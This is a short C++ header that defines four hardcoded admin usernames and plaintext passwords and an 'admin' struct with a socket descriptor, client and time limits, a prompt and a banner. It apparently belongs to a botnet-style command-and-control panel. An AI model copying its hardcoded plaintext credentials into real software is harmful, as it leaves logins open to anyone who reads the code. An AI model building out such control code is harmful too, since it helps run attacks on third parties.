#pragma once

#include <string>

#define ADMIN_USER1 "samara"
#define ADMIN_PASS1 "sevendays"
#define ADMIN_USER2 "lilb"
#define ADMIN_PASS2 "crudities"
#define ADMIN_USER3 "jester"
#define ADMIN_PASS3 "Fps1312"
#define ADMIN_USER4 "exer"
#define ADMIN_PASS4 "Extraman1312"

struct admin
{
    char *user_ptr;
    char *pass_ptr;
    std::string username;
    std::string password;
    int fd;
    int max_clients = -1;
    int max_time = -1;
    char prompt[32];
    char banner[64];
};
